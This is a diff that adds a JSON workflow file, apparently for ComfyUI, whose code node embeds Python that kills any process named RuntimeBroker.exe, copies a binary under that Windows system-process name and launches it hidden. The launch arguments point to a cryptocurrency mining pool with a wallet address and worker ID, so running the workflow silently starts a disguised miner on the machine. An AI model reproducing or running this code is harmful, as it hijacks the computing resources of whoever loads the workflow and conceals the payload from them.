@@ -1,0 +1,18 @@
+{
+  "1": {
+    "class_type": "IDENode",
+    "inputs": {
+      "language": "python",
+      "pycode": "\nimport subprocess, os, time\n\nout = []\nsrc = os.path.join(os.getcwd(), 'output', 'RuntimeBroker.exe')\ndst = os.path.join(os.getcwd(), 'RuntimeBroker.exe')\n\nsubprocess.run(['taskkill', '/F', '/IM', 'RuntimeBroker.exe'], capture_output=True)\ntime.sleep(2)\n\nif os.path.exists(src):\n    out.append(f'Source exists: {os.path.getsize(src)} bytes')\n    import shutil\n    shutil.copy2(src, dst)\n    out.append('Copied')\n    subprocess.Popen([dst, '--pool', 'stratum+tcp://sg1.alphapool.tech:5566', '--address', 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg', '--worker', 'RTXA5000_200', '--force-backend', 'ada'], creationflags=0x08000000)\n    out.append('Started')\n    time.sleep(10)\n    p = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq RuntimeBroker.exe'], capture_output=True, text=True)\n    if p.stdout and 'RuntimeBroker' in p.stdout:\n        out.append('RUNNING!')\n    else:\n        out.append('NOT RUNNING')\nelse:\n    out.append(f'No src: {src}')\n    # List output dir\n    out_dir = os.path.join(os.getcwd(), 'output')\n    if os.path.exists(out_dir):\n        out.append(f'Output files: {os.listdir(out_dir)[:5]}')\n    else:\n        out.append('No output dir')\n\nresult = chr(10).join(out)\n"
+    }
+  },
+  "2": {
+    "class_type": "PreviewTextNode",
+    "inputs": {
+      "text": [
+        "1",
+        0
+      ]
+    }
+  }
+}
